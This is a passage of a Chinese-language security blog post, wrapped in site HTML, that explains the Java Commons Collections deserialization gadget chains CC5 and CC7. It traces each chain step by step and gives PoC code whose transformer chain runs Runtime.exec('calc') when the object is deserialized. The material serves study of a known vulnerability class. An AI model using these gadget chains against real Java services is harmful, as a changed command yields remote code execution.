@@ -1,0 +1,551 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>java安全-CC5&amp;CC7 | 十七.</title><meta name="author" content="chuanchuan"><meta name="copyright" content="chuanchuan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="java安全链中的CC5与CC7，后半段还是CC1的逻辑，创新点在于找到了两个新的入口类。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="java安全-CC5&amp;CC7">
+<meta property="og:url" content="https://zc-18.github.io/2026/01/28/CC5-7-Gadget/index.html">
+<meta property="og:site_name" content="十七.">
+<meta property="og:description" content="java安全链中的CC5与CC7，后半段还是CC1的逻辑，创新点在于找到了两个新的入口类。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512191209.png">
+<meta property="article:published_time" content="2026-01-28T10:00:03.000Z">
+<meta property="article:modified_time" content="2026-01-28T15:56:03.654Z">
+<meta property="article:author" content="chuanchuan">
+<meta property="article:tag" content="CC链">
+<meta property="article:tag" content="java安全">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512191209.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "java安全-CC5&CC7",
+  "url": "https://zc-18.github.io/2026/01/28/CC5-7-Gadget/",
+  "image": "https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512191209.png",
+  "datePublished": "2026-01-28T10:00:03.000Z",
+  "dateModified": "2026-01-28T15:56:03.654Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "chuanchuan",
+      "url": "https://zc-18.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan1.png"><link rel="canonical" href="https://zc-18.github.io/2026/01/28/CC5-7-Gadget/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3-b2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e6047011fc3df8f4b86d7847de988e6d";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+btf.addGlobalFn('pjaxComplete', () => {
+  _hmt.push(['_trackPageview',window.location.pathname])
+}, 'baidu_analytics')
+</script><link rel="stylesheet" href="/%3Clink%20rel=%22stylesheet%22%20href=%22https:/fonts.googleapis.com/css2?family=Poppins:wght@700&amp;family=Noto+Serif+SC:wght@700&amp;display=swap%22%3E" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":false,"highlightLang":false,"highlightHeightLimit":380,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'java安全-CC5&CC7',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="gear-loader"><div class="gear-loader_overlay"></div><div class="gear-loader_cogs"><div class="gear-loader_cogs__top"><div class="gear-top_part"></div><div class="gear-top_part"></div><div class="gear-top_part"></div><div class="gear-top_hole"></div></div><div class="gear-loader_cogs__left"><div class="gear-left_part"></div><div class="gear-left_part"></div><div class="gear-left_part"></div><div class="gear-left_hole"></div></div><div class="gear-loader_cogs__bottom"><div class="gear-bottom_part"></div><div class="gear-bottom_part"></div><div class="gear-bottom_part"></div><div class="gear-bottom_hole"></div></div></div></div></div><script>(() => {
+  const box = document.getElementById('loading-box')
+  const body = document.body
+
+  let start = Date.now() // 动画开始时间
+
+  const end = () => {
+    const elapsed = Date.now() - start
+    const minDelay = Math.max(0, 1000 - elapsed) // 保证最少 1 秒
+
+    setTimeout(() => {
+      body.style.overflow = ''
+      box.classList.add('loaded')
+    }, minDelay)
+  }
+
+  // ===== 最多 3 秒强制结束 =====
+  const maxTimer = setTimeout(end, 3000)
+
+  // 页面加载完结束
+  if (document.readyState === 'complete') {
+    clearTimeout(maxTimer)
+    end()
+  } else {
+    window.addEventListener('load', () => {
+      clearTimeout(maxTimer)
+      end()
+    })
+  }
+
+  // ===== PJAX 支持 =====
+  if (true) {
+    btf.addGlobalFn(
+      'pjaxSend',
+      () => {
+        body.style.overflow = 'hidden'
+        box.classList.remove('loaded')
+        start = Date.now() // 重新计时
+        clearTimeout(maxTimer)
+        setTimeout(end, 3000) // PJAX 同样最多 3 秒
+      },
+      'gear_init'
+    )
+    btf.addGlobalFn('pjaxComplete', () => {
+      clearTimeout(maxTimer)
+      end()
+    }, 'gear_end')
+  }
+})()</script><div class="bg-animation" id="web_bg" style="background-color: #efefef;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan2.jpg" onerror="this.onerror=null;this.src='https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan10.png'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202512191209.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan1.png" alt="Logo"><span class="site-name">十七.</span></a><a class="nav-page-title" href="/"><span class="site-name">java安全-CC5&amp;CC7</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">java安全-CC5&amp;CC7</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-01-28T10:00:03.000Z" title="发表于 2026-01-28 18:00:03">2026-01-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-28T15:56:03.654Z" title="更新于 2026-01-28 23:56:03">2026-01-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CC%E9%93%BE/">CC链</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="java安全-CC5-CC7"><a href="#java安全-CC5-CC7" class="headerlink" title="java安全-CC5&amp;CC7"></a>java安全-CC5&amp;CC7</h1><ul>
+<li><strong>这俩条链都是在 Hashmap#get 方法之上，变换了与 CC1 不同的入口类即 readObject 方法调用类</strong></li>
+</ul>
+<h2 id="一、CC5"><a href="#一、CC5" class="headerlink" title="一、CC5"></a>一、CC5</h2><h3 id="1-主要逻辑"><a href="#1-主要逻辑" class="headerlink" title="1.主要逻辑"></a>1.主要逻辑</h3><h4 id="BadAttributeValueExpException-readObject"><a href="#BadAttributeValueExpException-readObject" class="headerlink" title="BadAttributeValueExpException#readObject"></a><code>BadAttributeValueExpException#readObject</code></h4><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601272140355.png" alt="image-20260127214015127"></p>
+<p><code>readObject</code>方法调用<code>toString</code>方法</p>
+<h4 id="TiedMapEntry-toString"><a href="#TiedMapEntry-toString" class="headerlink" title="TiedMapEntry#toString"></a><code>TiedMapEntry#toString</code></h4><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601272141763.png" alt="image-20260127214119652"></p>
+<p><code>TiedMapEntry#toString</code>这个方法属于<code>CC1</code>中的一部分，接着看<code>getValue</code>方法</p>
+<h4 id="TiedMapEntry-getValue"><a href="#TiedMapEntry-getValue" class="headerlink" title="TiedMapEntry#getValue"></a><code>TiedMapEntry#getValue</code></h4><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601272143245.png" alt="image-20260127214350029"></p>
+<p>这里会调用<code>get</code>方法，而<code>LazyMap</code>的<code>get</code>方法会调用链路<code>transform</code>方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601272144917.png" alt="image-20260127214451842"></p>
+<h3 id="2-poc"><a href="#2-poc" class="headerlink" title="2.poc"></a>2.poc</h3><p>编写<code>poc</code>，尝试满足条件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601272147468.png" alt="image-20260127214719358"></p>
+<p><code>BadAttributeValueExpException</code>这个类的构造方法会毁掉我们的恶意类<code>tiedMapEntry</code>，于是要通过反射最后修改</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setFieldValue(obj2,<span class="string">&quot;val&quot;</span>,tiedMapEntry);</span><br></pre></td></tr></table></figure>
+
+<p><strong>总poc</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">r</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chaun0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(r);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chuan2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">Transformer chuan3= <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">Transformer[] chuan = &#123;chaun0,chuan1,chuan2,chuan3&#125;;</span><br><span class="line"></span><br><span class="line">Map&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.lazyMap(map,<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>&lt;&gt;(chuan));</span><br><span class="line"></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"><span class="type">BadAttributeValueExpException</span> <span class="variable">obj2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">setFieldValue(obj2,<span class="string">&quot;val&quot;</span>,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">serialize(obj2);</span><br><span class="line">unserialize();</span><br></pre></td></tr></table></figure>
+
+<p><strong>成功</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601272146136.png" alt="image-20260127214627047"></p>
+<h2 id="二、CC7"><a href="#二、CC7" class="headerlink" title="二、CC7"></a>二、CC7</h2><h3 id="1-关键类"><a href="#1-关键类" class="headerlink" title="1.关键类"></a>1.关键类</h3><h4 id="Hashtable-readObject"><a href="#Hashtable-readObject" class="headerlink" title="Hashtable#readObject"></a><code>Hashtable#readObject</code></h4><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601272215056.png" alt="image-20260127221505217"></p>
+<p>这里调用了<code>Hashtable#reconstitutionPut</code>方法</p>
+<h4 id="Hashtable-reconstitutionPut"><a href="#Hashtable-reconstitutionPut" class="headerlink" title="Hashtable#reconstitutionPut"></a><code>Hashtable#reconstitutionPut</code></h4><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601272215288.png" alt="image-20260127221558196"></p>
+<p>这里调用了<code>equals</code>方法</p>
+<h4 id="AbstractMap-equals"><a href="#AbstractMap-equals" class="headerlink" title="AbstractMap#equals"></a><code>AbstractMap#equals</code></h4><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601272218347.png" alt="image-20260127221751012"></p>
+<p><code>AbstractMap#equals</code><strong>方法会调用 get 方法，刚好接上链条后半段</strong></p>
+<h3 id="2-主要逻辑"><a href="#2-主要逻辑" class="headerlink" title="2.主要逻辑"></a>2.主要逻辑</h3><h4 id="A、reconstitutionPut方法"><a href="#A、reconstitutionPut方法" class="headerlink" title="A、reconstitutionPut方法"></a>A、<code>reconstitutionPut</code>方法</h4><p><img src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/chuan100.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/zc-18/chuanimages@main/img/202601272220746.png" alt="image-20260127222020653"></p>
+<p>这个方法调用<code>equals</code>是有条件的</p>
+<p><code>Hashtable</code> 里需要有两个 Map（<code>lazyMap1</code> 和 <code>lazyMap2</code>），它们的 HashCode 是一样的，这意味着它们都要存进<strong>同一个编号的柜子</strong>（比如第 5 号柜子）。</p>
+<p>第一轮：存入 <code>lazyMap1</code></p>
+<ol>
+<li><strong>检查柜子</strong>：程序走到 <code>for</code> 循环，去看 <code>tab[5]</code>（第 5 号柜子）。</li>
+<li><strong>发现为空</strong>：此时柜子是空的（<code>null</code>）。</li>
+<li><strong>跳过循环</strong>：因为 <code>e == null</code>，<strong>for 循环一次都不会执行</strong>。当然也就不会执行里面的 <code>e.key.equals(key)</code>。</li>
+<li><strong>直接存入</strong>：程序跳过循环，执行下面的代码，把 <code>decorateMap1</code> 放进了 <code>tab[5]</code>。</li>
+</ol>
+<p>第二轮：存入 <code>lazyMap2</code></p>
+<ol>
+<li><strong>检查柜子</strong>：程序再次走到 <code>for</code> 循环，去看 <code>tab[5]</code>。</li>
+<li><strong>发现有人</strong>：此时 <code>tab[5]</code> 里已经坐着 <code>decorateMap1</code> 了（<code>e != null</code>）。</li>
+<li><strong>进入循环</strong>：因为柜子不为空，程序<strong>被迫进入循环</strong>。</li>
+<li><strong>进行盘问 (触发漏洞)</strong>：<ul>
+<li>程序心想：“这个新来的（<code>lazyMap2</code>）和已经在里面的（<code>lazyMap1</code>）是不是同一个东西？”</li>
+<li>它执行了 <code>e.key.equals(key)</code>，也就是 <code>decorateMap1.equals(decorateMap2)</code>。</li>
+<li><strong>💥 轰！</strong> 这一比较，触发了 <code>LazyMap</code> 的 <code>get</code>，弹出了计算器。</li>
+</ul>
+</li>
+</ol>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 遍历哈希桶（链表），检查里面是不是已经有这个 Key 了</span></span><br><span class="line"><span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果 Hash 值一样，并且 Key 的内容也一样（equals 返回 true）</span></span><br><span class="line">    <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 抛出异常：数据流损坏（因为 Map 不允许有重复的 Key！）</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>同时，为了构造 e.hash &#x3D;&#x3D; hash ，找到java中的一个小 bug</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;yy&quot;</span>.hashCode() == <span class="string">&quot;zZ&quot;</span>.hashCode()</span><br></pre></td></tr></table></figure>
+
+<p><strong>最后便是</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap1</span>  <span class="operator">=</span> LazyMap.lazyMap(map1,<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>&lt;&gt;(chuan));</span><br><span class="line">lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Map&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.lazyMap(map2,<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>&lt;&gt;(chuan));</span><br><span class="line">lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">obj2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">obj2.put(lazyMap1,<span class="number">1</span>);</span><br><span class="line">obj2.put(lazyMap2,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>问题1：<code>equals</code> 的“懒惰”优化（直接返回）</p>
+<p>如果你传的是<strong>同一个对象</strong>（比如 <code>put(map1, val); put(map1, val);</code>）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// AbstractMap.equals 源码第一行</span><br><span class="line">if (o == this)</span><br><span class="line">    return true;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>后果</strong>：代码在第一行就检测到是同一个对象引用，直接返回 <code>true</code>。</li>
+<li><strong>结局</strong>：后面的逻辑全部跳过，根本不会执行 <code>m.get()</code>，计算器弹不出来。</li>
+</ul>
+<p>问题2：LazyMap 的“缺货”机制（这是最关键的！）</p>
+<p>假设你传了<strong>两个不同的对象</strong>，但它们的<strong>内容是一样</strong>的（比如 <code>map1</code> 里有 key “yy”，<code>map2</code> 里也有 key “yy”）。</p>
+<p>当 <code>Hashtable</code> 强迫它们比较时，<code>AbstractMap.equals</code> 会执行以下逻辑：</p>
+<ol>
+<li><code>map1</code> 说：“我有 key <code>&quot;yy&quot;</code>，我要去检查 <code>map2</code> 有没有这个 key。”</li>
+<li>代码执行：<code>map2.get(&quot;yy&quot;)</code>。</li>
+<li><strong>关键时刻</strong>：<ul>
+<li><code>LazyMap</code> 的逻辑是：<strong>“只有当你找我要一个我不存在的 key 时，我才会去调用 Transformer（执行命令）。”</strong></li>
+<li>因为 <code>map2</code> 里面<strong>也有</strong> <code>&quot;yy&quot;</code>，它会直接把值返回给你。</li>
+</ul>
+</li>
+<li><strong>结局</strong>：<code>get</code> 方法正常返回，不触发 Transformer，计算器弹不出来。</li>
+</ol>
+<p> <strong>“yy” 和 “zZ” 这种组合</strong></p>
+<ol>
+<li><strong>既骗过 Hashtable</strong>：让它以为这两个 Map 是一样的（HashCode 必须相同），这样才能强迫它们走进同一个柜子，触发 <code>equals</code> 比较。<ul>
+<li>这就是为什么选 <code>&quot;yy&quot;</code> 和 <code>&quot;zZ&quot;</code>，因为它俩 HashCode 一样，导致包裹它们的 Map HashCode 也一样。</li>
+</ul>
+</li>
+<li><strong>又骗过 LazyMap</strong>：让它发现这两个 Map 内容其实不一样（Key 不同），这样才能触发“找不到 Key”的逻辑。<ul>
+<li><code>map1</code> 有 <code>&quot;yy&quot;</code>。</li>
+<li><code>map2</code> 有 <code>&quot;zZ&quot;</code> (没有 <code>&quot;yy&quot;</code>)。</li>
+<li>当 <code>map1</code> 拿 <code>&quot;yy&quot;</code> 去问 <code>map2</code> 时，<code>map2</code> 发现自己没货，于是触发 Transformer，<strong>BOOM！</strong></li>
+</ul>
+</li>
+</ol>
+<h4 id="B、AbstractMap-equals方法逻辑"><a href="#B、AbstractMap-equals方法逻辑" class="headerlink" title="B、AbstractMap#equals方法逻辑"></a>B、<code>AbstractMap#equals</code>方法逻辑</h4><ol>
+<li><strong>Hashtable#reconstitutionPut</strong><ul>
+<li><strong>你的理解</strong>：确实是起点。因为 Hash 碰撞，触发了 <code>e.key.equals(key)</code>。</li>
+<li><strong>实际动作</strong>：<code>lazyMap1.equals(lazyMap2)</code>。</li>
+</ul>
+</li>
+<li><strong>LazyMap#equals</strong><ul>
+<li><strong>你的理解</strong>：它没有这个方法。</li>
+<li><strong>实际动作</strong>：JVM 自动去查它的父类 <code>AbstractMapDecorator</code>。</li>
+</ul>
+</li>
+<li><strong>AbstractMapDecorator#equals</strong><ul>
+<li><strong>你的理解</strong>：调用 <code>decorated().equals(object)</code>。</li>
+<li><strong>实际动作</strong>：这就是**“甩锅”**。它把判断任务转交给了它包裹的 <code>map</code>（也就是 <code>hashMap1</code>）。此时变成了 <code>hashMap1.equals(lazyMap2)</code>。</li>
+</ul>
+</li>
+<li><strong>HashMap#equals</strong><ul>
+<li><strong>你的理解</strong>：HashMap 也没有这个方法。</li>
+<li><strong>实际动作</strong>：JVM 继续向上找父类，找到了 <code>AbstractMap</code>。</li>
+</ul>
+</li>
+<li><strong>AbstractMap#equals</strong><ul>
+<li><strong>你的理解</strong>：在调用它的父类，最终调用 <code>get</code> 方法。</li>
